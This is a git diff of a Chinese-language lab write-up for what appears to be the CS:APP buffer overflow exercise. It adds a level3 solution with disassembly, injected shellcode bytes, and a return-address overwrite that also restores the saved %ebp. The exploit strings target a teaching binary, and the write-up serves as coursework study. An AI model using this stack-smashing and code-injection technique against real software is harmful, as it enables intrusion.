@@ -87,7 +87,7 @@ void test()
     } else {
         printf("Dud: getbuf returned 0x%x\n", val);
     }
-    }
+}
 ```
 
 ```assembly
@@ -118,7 +118,7 @@ getbuf():
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
-00 00 00 00 0b 8e 04 08     /* 45 ~ 48 跳转 */
+00 00 00 00 0b 8e 04 08     /* 44 ~ 47 跳转 */
 ```
 ![VALID0](./image/VALID0.png)
 
@@ -188,10 +188,10 @@ bang():
 这一题要求`global_value == cookie`。  
 然而`global_value`的地址在`0x804d10c`，输入的字符串的首地址在`0x556835e8`，肯定不能直接垫到那里。  
 这时可以考虑在输入的字符串内写一小块汇编代码，然后在执行getbuf()的ret时跳到我们写的代码那里。  
-![stack_0x55683614](./image/stack_0x55683614.jpg)
+![stack_0x55683614](./image/stack_0x55683614.jpg)  
 代码中则执行将`cookie`也就是`0x17dab4ef`写到`global_value`的地址`0x804d10c`。  
 然后通过`push`和`ret`配合再跳转到bang()函数的位置`0x8048d52`。  
-![stack_0x556835e8](./image/stack_0x556835e8.jpg)
+![stack_0x556835e8](./image/stack_0x556835e8.jpg)  
 这样就能实现将`global_value`的值替换为`cookie`。  
 汇编代码如下: 
 ```assembly
@@ -232,3 +232,85 @@ da 17 68 52 8d 04 08 c3     /* push   $0x8048d52 */
 56 57 58 59 60 61 62 63
 ```
 ![VALID2](./image/VALID2.png)
+
+## level3
+```c
+void test()
+{
+    int val;
+    /* Put canary on stack to detect possible corruption */
+    volatile int local = uniqueval();
+
+    val = getbuf();
+
+    /* Check for corrupted stack */
+    if (local != uniqueval()) {     // uniqueval不用管
+        printf("Sabotaged!: the stack has been corrupted\n");
+    }
+    else if (val == cookie) {       // getbuf()返回值固定为1，怎么把这个1改为cookie
+        printf("Boom!: getbuf returned 0x%x\n", val);
+        validate(3);
+    } else {
+        printf("Dud: getbuf returned 0x%x\n", val);
+    }
+}
+```
+```assembly
+08049262 <getbuf>:
+getbuf():
+ 8049262:	55                   	push   %ebp
+ 8049263:	89 e5                	mov    %esp,%ebp
+ 8049265:	83 ec 38             	sub    $0x38,%esp
+ 8049268:	8d 45 d8             	lea    -0x28(%ebp),%eax		# 缓冲区大小为0x28（40）
+ 804926b:	89 04 24             	mov    %eax,(%esp)
+ 804926e:	e8 bf f9 ff ff       	call   8048c32 <Gets>
+ 8049273:	b8 01 00 00 00       	mov    $0x1,%eax            # 返回%eax
+ 8049278:	c9                   	leave  
+ 8049279:	c3                   	ret    
+```
+```assembly
+08048e3c <test>:
+test():
+ 8048e3c:	55                   	push   %ebp
+ 8048e3d:	89 e5                	mov    %esp,%ebp
+ 8048e3f:	53                   	push   %ebx
+ 8048e40:	83 ec 24             	sub    $0x24,%esp
+ 8048e43:	e8 d0 fd ff ff       	call   8048c18 <uniqueval>			# 第一个uniqueval存在%edx
+ 8048e48:	89 45 f4             	mov    %eax,-0xc(%ebp)
+ 8048e4b:	e8 12 04 00 00       	call   8049262 <getbuf>				# 根据这个getbuf的缓冲区溢出跳转到别的函数
+ 8048e50:	89 c3                	mov    %eax,%ebx					# getbuf的返回值存在%ebx
+ 8048e52:	e8 c1 fd ff ff       	call   8048c18 <uniqueval>			# 第二个uniqueval存在%eax
+ 8048e57:	8b 55 f4             	mov    -0xc(%ebp),%edx				# 执行到这里时发生段错误，%ebp出问题
+```
+这一题要求`val == cookie`，`val`是getbuf()函数的返回值。  
+然而根据getbuf()函数的汇编代码可知，它的返回值固定为1，用`%eax`保存。  
+那么我们可以在上一题的代码上做修改，把`cookie`加载到`%eax`。  
+返回地址也要改为test()函数中调用getbuf()函数指令的下一条指令的地址`0x8048e50`。  
+答案如下:   
+```
+b8 ef b4 da 17 68 50 8e     /* movl $0x17dab4ef,%eax */
+04 08 c3 11 12 13 14 15     /* push $0x8048e50 */
+16 17 18 19 20 21 22 23     /* ret */
+24 25 26 27 28 29 30 31
+32 33 34 35 36 37 38 39
+40 41 42 43 e8 35 68 55     /* 44 ~ 47 跳转 */
+48 49 50 51 52 53 54 55
+56 57 58 59 60 61 62 63
+```
+然而这一题并没有这么简单，当程序更改`%eax`返回到test()函数后，在`8048e57:	mov -0xc(%ebp),%edx`处发生段错误。  
+gdb调试发现执行到此处时`%ebp`的值为`0x43424140`，就是这里出了问题。  
+多亏了我们按照顺序填补答案空缺，我们可以很迅速地定位到要修改的位置。那么，要把`%ebp`改为什么值呢？  
+可以先正常执行一次程序而不用缓存区溢出攻击，在发生段错误的位置设置断点，查看正常执行时`%ebp`的值。  
+(也可以根据汇编代码反退出来，不过我懒得推)
+得到`%ebp`原本的值`0x55683640`，写入答案:   
+```
+b8 ef b4 da 17 68 50 8e     /* movl $0x17dab4ef,%eax */
+04 08 c3 11 12 13 14 15     /* push $0x8048e50 */
+16 17 18 19 20 21 22 23     /* ret */
+24 25 26 27 28 29 30 31
+32 33 34 35 36 37 38 39
+40 36 68 55 e8 35 68 55     /* 40 ~ 43 恢复%ebp，44 ~ 47 跳转 */
+48 49 50 51 52 53 54 55
+56 57 58 59 60 61 62 63
+```
+![VALID3](./image/VALID3.png)
